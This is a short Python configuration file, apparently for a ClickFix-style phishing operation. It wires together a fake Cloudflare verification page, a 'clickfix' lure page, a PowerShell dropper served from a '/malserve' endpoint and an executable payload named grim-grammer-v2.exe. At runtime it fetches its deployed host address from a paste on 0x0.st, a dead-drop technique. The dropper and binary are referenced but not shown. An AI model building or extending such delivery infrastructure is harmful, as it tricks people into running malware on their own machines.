import os
import requests


#Main Condition
isDeployed = os.environ.get("IS_DEPLOYED","NOPE") == "YEP"

#Static Mere Configs
socialENGServerFile = "pagesServer.py"
fielServerFile = "filesServer.py"
slash = "/" if isDeployed else "\\"



#lambda getters
getDeployedHost = lambda _0_X_0_ST_url:requests.get(_0_X_0_ST_url).text.split("=")
setDeployedHost = lambda host :host[1]
DeployedPort = lambda:os.environ["PORT"]

#URI Building
proto = 'https://' if isDeployed else 'http://'
port = "443" if isDeployed else "80"
host = "localhost" if not isDeployed else setDeployedHost(getDeployedHost(_0_X_0_ST_url="https://0x0.st/Piqn.txt"))
deliveryServerPort = "10000"

#Endpoints and FILEPATHS
hookPageEndpoint = "/45f95d55-8681-46b0-8afa-6d87b02e01dc"
binName = "grim-grammer-v2.exe"
binEndpoint = "/grim-grammer-v2.exe"
dropperEndpoint = "/malserve"
dropperName = "test.ps1"
payloadFolder = f".{slash}bin{slash}" 
staticFolder = f".{slash}static{slash}"




#CONVININCE WRAPPERs
conf = {
    "URLS":{
        "powershell_dropper_url":f"{proto}{host}:{deliveryServerPort}{dropperEndpoint}",
        "actual_binary_payload":f"{proto}{host}:{deliveryServerPort}{binEndpoint}",
        "clickfix_page_endpoint":f"{proto}{host}{hookPageEndpoint}"
    },
    "PATHS":{
        "cloudflare_page":f"{staticFolder}cloudflare.html",
        "clickfix_page":f"{staticFolder}clickfix.html",
        "dropper":f"{payloadFolder}{dropperName}",
        "binary_payload":f"{payloadFolder}{binName}"
    }
}